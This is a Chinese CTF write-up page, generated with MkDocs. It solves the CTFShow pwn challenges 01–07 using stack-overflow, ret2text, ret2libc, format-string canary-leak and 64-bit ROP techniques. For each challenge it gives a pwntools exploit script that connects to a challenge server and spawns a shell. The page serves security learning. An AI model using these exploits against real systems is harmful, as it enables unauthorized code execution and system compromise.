@@ -1,0 +1,902 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      <link rel="shortcut icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.1.3">
+    
+    
+      
+        <title>Pwn_CTFShow_01 - Trick</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.2cb7adb3.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.f0267088.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#000000">
+        
+      
+    
+    
+    
+      
+        
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="black" data-md-color-accent="pink">
+      
+  
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#pwn_ctfshow" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href=".." title="Trick" class="md-header-nav__button md-logo" aria-label="Trick">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      
+        <div class="md-header-nav__ellipsis">
+          <span class="md-header-nav__topic md-ellipsis">
+            Trick
+          </span>
+          <span class="md-header-nav__topic md-ellipsis">
+            
+              Pwn_CTFShow_01
+            
+          </span>
+        </div>
+      
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Trick" class="md-nav__button md-logo" aria-label="Trick">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    Trick
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href=".." class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      Pwn基础
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Pwn基础" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon"></span>
+        Pwn基础
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../test/" class="md-nav__link">
+      test
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+    
+    <label class="md-nav__link" for="nav-3">
+      writeUp
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="writeUp" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        <span class="md-nav__icon md-icon"></span>
+        writeUp
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Pwn_buuctf/" class="md-nav__link">
+      Pwn_buuctf
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Pwn_CTFShow_01
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      Pwn_CTFShow_01
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1pwn" class="md-nav__link">
+    1.PWN签到题
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2pwn02" class="md-nav__link">
+    2.pwn02
+  </a>
+  
+    <nav class="md-nav" aria-label="2.pwn02">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ret2text" class="md-nav__link">
+    ret2text
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3pwn03" class="md-nav__link">
+    3.pwn03
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4pwn04" class="md-nav__link">
+    4.pwn04
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5pwn05" class="md-nav__link">
+    5.pwn05
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6pwn06" class="md-nav__link">
+    6.pwn06
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7pwn07" class="md-nav__link">
+    7.pwn07
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Pwn_CTFShow_02/" class="md-nav__link">
+      Pwn_CTFShow_02
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Pwn_0xGame_01/" class="md-nav__link">
+      Pwn_0xGame_01
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Pwn_0xGame_02/" class="md-nav__link">
+      Pwn_0xGame_02
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      其他记录
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="其他记录" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        <span class="md-nav__icon md-icon"></span>
+        其他记录
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Pwn%28ubuntu_docker%29/" class="md-nav__link">
+      Pwn(ubuntu docker)
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../aboutMkdocs/" class="md-nav__link">
+      MkDocs
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1pwn" class="md-nav__link">
+    1.PWN签到题
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2pwn02" class="md-nav__link">
+    2.pwn02
+  </a>
+  
+    <nav class="md-nav" aria-label="2.pwn02">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ret2text" class="md-nav__link">
+    ret2text
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3pwn03" class="md-nav__link">
+    3.pwn03
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4pwn04" class="md-nav__link">
+    4.pwn04
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5pwn05" class="md-nav__link">
+    5.pwn05
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6pwn06" class="md-nav__link">
+    6.pwn06
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7pwn07" class="md-nav__link">
+    7.pwn07
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="pwn_ctfshow">Pwn_CTFShow</h1>
+<h2 id="1pwn">1.PWN签到题</h2>
+<p>直接 <code>nc</code></p>
+<p>出flag，白给</p>
+<h2 id="2pwn02">2.pwn02</h2>
+<h3 id="ret2text">ret2text</h3>
+<p>file 一下
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201003165432499.png#pic_center" /></p>
+<p>32bit</p>
+<p>IDA分析
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2020100316555337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
+<p>发现 bin/sh 地址</p>
+<p>可以用 <code>cyclic</code>生成字符串，然后gdb run一下，再计算出偏移
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201003165929850.png#pic_center" /></p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/202010031701141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201003170147811.png#pic_center" />
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201003170222624.png#pic_center" />
+<code>cyclic -l 0x......</code>
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201003170357937.png#pic_center" /></p>
+<p>exp：</p>
+<pre><code class="language-python">from pwn import *
+
+p=remote('111.231.70.44',28042)
+
+payload='a'*13 + p32(0x8048518)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<h2 id="3pwn03">3.pwn03</h2>
+<p><a href="https://blog.csdn.net/gd_9988/article/details/106744216">参考博客</a></p>
+<p>先<code>checksec</code>一下
+<img alt="" src="https://img-blog.csdnimg.cn/20201005131216747.png#pic_center" />
+32bit 程序
+IDA分析
+先看main函数
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005131301855.png#pic_center" />
+没有什么线索，再进pwnme函数</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005131359321.png#pic_center" />
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005131425904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" />
+发现存在一个栈溢出
+由于找不到system函数的地址，所以</p>
+<blockquote>
+<p>涉及到plt表和got表
+程序执行后，plt表里是got表的地址，got表是函数的真实地址
+程序还未执行时，got表里还是plt表的地址
+我们需要泄漏got表里的地址，由于开启了ASLR，本地和远程的地址不一样
+但也只是针对于地址中间位进行随机，最低的12位并不会发生改变
+也就是我们需要获取到远程环境的函数的真实地址
+进而判断libc的版本，计算泄漏的函数got表的地址与system的偏移，然后获取到system函数的真实地址，进而计算system函数与/bin/sh的偏移，最终getshell
+所以我们首先exp的构造
+首先栈溢出，利用puts函数的plt表的地址，泄漏puts函数的got表中的函数的真实地址,然后返回地址填写main函数重新跳转回来</p>
+</blockquote>
+<p>exp：</p>
+<pre><code class="language-python">from pwn import *
+#context.log_level = 'debug'
+
+p = remote('111.231.70.44',28063)
+#p = process('./stack1')
+
+elf = ELF('./stack1')
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main_addr = elf.symbols['main']
+
+payload = &quot;A&quot;*13 + p32(puts_plt) + p32(main_addr) + p32(puts_got)
+
+p.sendline(payload)
+
+p.recvuntil('\n\n')
+
+get_addr = u32(p.recv(4))
+
+print(hex(get_addr))
+</code></pre>
+<p>输出了puts函数的真实地址
+ps：这里要remote过去，否则输出的地址会不一样</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005133520774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
+<p>可以通过后三位判断libc的版本
+<a href="https://libc.blukat.me/">libcSearch</a></p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005134105795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" />
+知道这些信息之后
+exp：</p>
+<pre><code class="language-python">from pwn import *
+#context.log_level = 'debug'
+
+p = remote('111.231.70.44',28063)
+#p = process('./stack1')
+
+elf = ELF('./stack1')
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main_addr = elf.symbols['main']
+
+payload = &quot;A&quot;*13 + p32(puts_plt) + p32(main_addr) + p32(puts_got)
+
+p.sendline(payload)
+
+p.recvuntil('\n\n')
+
+get_addr = u32(p.recv(4))
+
+print(hex(get_addr))
+
+libcbase = get_addr - 0x067360
+system_addr = libcbase + 0x03cd10
+bin_sh = libcbase + 0x17b8cf
+payload = flat(['A'*13,system_addr,'AAAA',bin_sh])
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<h2 id="4pwn04">4.pwn04</h2>
+<p>先checksec
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2020100514433593.png#pic_center" />
+栈不可执行
+Canary打开</p>
+<blockquote>
+<p>canary:
+用于防止栈溢出被利用的一种方法，原理是在栈的ebp下面放一个随机数，在函数返回之前会检查这个数有没有被修改，就可以检测是否发生栈溢出。</p>
+</blockquote>
+<p>main函数：
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005144542442.png#pic_center" />
+没有线索，跟进vuln函数</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005144639881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" />
+看到v3就是canary了
+也就是下面的 [ebp-0ch]
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005145903257.png#pic_center" />
+在vuln函数中canary赋值给了eax
+我们可以通过在这个赋值之后下一个断点，来获取canary的值
+在此之前我们需要知道printf函数的地址，用来找到canary的偏移
+所以要先在printf函数下面下一个断点
+<code>b printf</code></p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005150508325.png#pic_center" />
+<code>run</code></p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005152146251.png#pic_center" />
+可以看到
+printf函数的地址是 0xffffd0b0</p>
+<p>然后在canary赋值之后下一个断点
+ps：在vuln函数和main函数中都有canary的赋值</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005151100579.png#pic_center" />
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005151126582.png#pic_center" /></p>
+<p>这里需要用main函数里面的（我也不知道为什么。。。
+<code>b *0x080486C9</code></p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005152008443.png#pic_center" /></p>
+<p>这样就找到了canary的值
+之后看printf的地址，找到canary的值，然后算出偏移
+<code>x/40wx 0xffffd0b0</code>
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005151654295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" />
+发现0x0x1276e500的偏移为31，所以构造canary的值为%31$x
+canary的值要靠我们的输入buf来赋值，所以要计算一下buf和v3的偏移 = (0x70-0xC) =100
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005153200798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" />
+最后还有 (0x8+4) = 12 个字节需要覆盖，覆盖返回地址到system函数才能取得shell</p>
+<p>exp：</p>
+<pre><code class="language-python">from pwn import *
+
+p =remote(&quot;111.231.70.44&quot;,28017)
+
+p.recv()
+leak_canary = &quot;%31$x&quot;
+p.sendline(leak_canary)
+canary = int(p.recv(),16)
+
+print(hex(canary))
+
+getshell = &quot;a&quot; * 100 + p32(canary) + &quot;b&quot; * 12 + p32(0x0804859B)
+
+p.sendline(getshell)
+
+p.interactive()
+</code></pre>
+<h2 id="5pwn05">5.pwn05</h2>
+<p>IDA分析一下</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005154604507.png#pic_center" />
+gets函数 明显的溢出
+双击s
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005154653584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" />
+偏移为 (0x14+4)
+再 Shift+F12
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005154801510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" />
+找到 /bin/sh </p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005154913771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" />
+exp：</p>
+<pre><code class="language-python">from pwn import *
+
+p=remote('111.231.70.44',28024)
+
+payload='a'*(0x14+4) + p32(0x08048486)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<h2 id="6pwn06">6.pwn06</h2>
+<p>64位的pwn05
+所以和上一题是差不多的
+不同的是这里要平衡堆栈
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005160148927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" />
+push rbp ：将bp寄存器的值压入栈中 
+然后再看偏移
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201005160422216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" />
+这里32位是4，而64位则是8</p>
+<p>exp：</p>
+<pre><code class="language-python">from pwn import *
+
+p=remote('111.231.70.44',28070)
+
+payload='a'*(0xc+8) + p64(0x400577)+ p64(0x400577)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<h2 id="7pwn07">7.pwn07</h2>
+<p>先checksec一下
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012192733970.png#pic_center" />
+这题和pwn03差的不多
+pwn03是32bit的，这题是64bit的
+64比32需要的payload多了一个pop rdi,ret</p>
+<pre><code class="language-python">32位：
+payload：&quot;a&quot;*offset + p32(plt) + p32(ret_addr) + p32(got)
+getshell: &quot;a&quot;*offset + p32(system_addr) + &quot;AAAA&quot; + p32(str_bin_sh)
+64位：
+payload：&quot;a&quot;*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr)
+getshell: &quot;a&quot;*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh)
+</code></pre>
+<p><code>ROPgadget --binary [file name]</code>
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012194105578.png#pic_center" />
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012194138780.png#pic_center" /></p>
+<p>exp：</p>
+<pre><code class="language-python">from pwn import *
+
+context.log_level = 'debug'
+
+context.arch = 'amd64'
+
+#p = process('./pwn')
+
+p = remote('111.231.70.44',28049)
+
+elf = ELF('./pwn')  #产生一个对象
+
+puts_plt = elf.plt['puts']
+
+puts_got = elf.got['puts']
+
+pop_rdi = 0x4006e3 # ROPgadget --binary [file name]
+
+main = elf.symbols['main']  #elf.symbols['a_function']  找到 a_function 的地址
+
+payload = 'a'*20 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
+#64位payload: &quot;a&quot;*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)
+
+p.sendline(payload)
+
+p.recvuntil('\x0a') #p.recvuntil(some_string) 接收到 some_string 为止
+
+puts_addr = u64(p.recv(6).ljust(8,b'\x00')) #p.recvn(N)   接受 N(数字) 字符
+
+print(hex(puts_addr))
+
+ret_addr = 0x4006E4
+
+libcbase = puts_addr -  0x0809c0    # -libc_Offset的puts
+
+system_addr = libcbase + 0x04f440   # +libc_Offset的system
+
+bin_sh = libcbase + 0x1b3e9a        # +libc_Offset的bin/sh
+
+payload = 'a'*20 + ret_addr + pop_rdi + bin_sh + system_addr
+#getshell: b&quot;a&quot;*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh)
+
+p.sendline(payload)
+
+p.interactive()
+
+
+</code></pre>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../Pwn_buuctf/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                Pwn_buuctf
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../Pwn_CTFShow_02/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  下一页
+                </span>
+                Pwn_CTFShow_02
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../assets/javascripts/vendor.7e0ee788.min.js"></script>
+      <script src="../assets/javascripts/bundle.c1ccee15.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "..",
+          features: [],
+          search: Object.assign({
+            worker: "../assets/javascripts/worker/search.4ac00218.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
